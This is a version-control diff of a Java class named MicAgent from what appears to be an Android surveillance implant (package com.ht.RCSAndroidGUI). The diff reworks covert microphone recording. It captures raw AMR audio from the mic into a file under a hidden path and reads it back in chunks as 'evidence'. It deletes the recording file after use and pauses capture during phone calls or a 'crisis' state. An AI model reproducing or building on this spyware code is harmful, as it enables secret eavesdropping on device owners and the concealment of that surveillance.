@@ -8,6 +8,7 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI.agent;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.Random;
 
@@ -72,7 +73,8 @@ public class MicAgent extends AgentBase {
 
 	private long fId;
 	private String currentRecFile;
-	private String lastRecFile;
+	//private String lastRecFile;
+	int fileOffset;
 
 	/*
 	 * (non-Javadoc)
@@ -105,11 +107,6 @@ public class MicAgent extends AgentBase {
 
 	}
 
-	private void addPhoneListener() {
-		// TODO Auto-generated method stub
-
-	}
-
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -136,12 +133,59 @@ public class MicAgent extends AgentBase {
 
 	}
 
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
+	 */
+	@Override
+	public void go() {
+		synchronized (stateLock) {
+			if (state == StateRun.STARTED) {
+				int amp = recorder.getMaxAmplitude();
+				int audio = recorder.getAudioSourceMax();
+
+				if (amp != 0) {
+					Log.d("QZ", TAG + " (go): max amplitude=" + amp);
+				}
+				if (audio != 0) {
+					Log.d("QZ", TAG + " (go): max audio=" + audio);
+				}
+				
+				if (numFailures < 10) {
+					//restartRecorder();
+					//Utils.sleep(1000);
+					saveRecorderEvidence();
+
+				} else {
+					Log.d("QZ", TAG + "numFailures: " + numFailures);
+					suspend();
+				}
+
+				if (callInAction()) {
+					Log.d("QZ", TAG + "phone call in progress, suspend!");
+					suspend();
+
+				} else if (Status.self().crisisMic()) {
+					Log.d("QZ", TAG + "crisis, suspend!");
+					suspend();
+				}
+			}
+		}
+	}
+
+	private void addPhoneListener() {
+		// TODO Auto-generated method stub
+
+	}
+
 	private void saveRecorderEvidence() {
 		// #ifdef DBC
 		Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
 		// #endif
 
 		final byte[] chunk = getAvailable();
+		
 
 		if (chunk != null && chunk.length > 0) {
 
@@ -164,16 +208,15 @@ public class MicAgent extends AgentBase {
 		}
 	}
 
+	
 	private byte[] getAvailable() {
-		AutoFile file = new AutoFile(lastRecFile);
-		byte[] ret = file.read();
-		file.delete();
+		AutoFile file = new AutoFile(currentRecFile);
+		
+		byte[] ret = file.read(fileOffset);
+		fileOffset += ret.length;
+		
+
 		return ret;
-	}
-
-	private void removePhoneListener() {
-		// TODO Auto-generated method stub
-
 	}
 
 	/*
@@ -186,39 +229,6 @@ public class MicAgent extends AgentBase {
 		setPeriod(MIC_PERIOD);
 		setDelay(MIC_PERIOD);
 		return true;
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
-	 */
-	@Override
-	public void go() {
-		synchronized (stateLock) {
-			if (state == StateRun.STARTED) {
-
-				Log.d("QZ", TAG + " (go): max amplitude=" + recorder.getMaxAmplitude());
-				if (numFailures < 10) {
-					restartRecorder();
-					Utils.sleep(1000);
-					saveRecorderEvidence();
-
-				} else {
-					Log.d("QZ", TAG + "numFailures: " + numFailures);
-					suspend();
-				}
-
-				if (callInAction()) {
-					Log.d("QZ", TAG + "phone call in progress, suspend!");
-					suspend();
-
-				} else if (Status.self().crisisMic()) {
-					Log.d("QZ", TAG + "crisis, suspend!");
-					suspend();
-				}
-			}
-		}
 	}
 
 	private void restartRecorder() {
@@ -234,11 +244,6 @@ public class MicAgent extends AgentBase {
 		}
 	}
 
-	private boolean callInAction() {
-		// TODO Auto-generated method stub
-		return false;
-	}
-
 	/**
 	 * Start recorder.
 	 * 
@@ -251,8 +256,8 @@ public class MicAgent extends AgentBase {
 
 		numFailures = 0;
 
-		lastRecFile = currentRecFile;
-		currentRecFile = Path.hidden() + "currentRec_" + Utils.getTimeStamp();
+		//lastRecFile = currentRecFile;
+		currentRecFile = Path.hidden() + "currentRec" + Utils.getTimeStamp();
 
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
@@ -274,6 +279,10 @@ public class MicAgent extends AgentBase {
 			recorder.reset(); // You can reuse the object by going back to
 								// setAudioSource() step
 			// recorder.release(); // Now the object cannot be reused
+			getAvailable();
+			
+			File file = new File(currentRecFile);
+			file.delete();
 		}
 	}
 
@@ -296,5 +305,15 @@ public class MicAgent extends AgentBase {
 		Check.ensures(additionalData.length == tlen, "Wrong additional data name");
 		// #endif
 		return additionalData;
+	}
+
+	private boolean callInAction() {
+		// TODO Auto-generated method stub
+		return false;
+	}
+
+	private void removePhoneListener() {
+		// TODO Auto-generated method stub
+	
 	}
 }
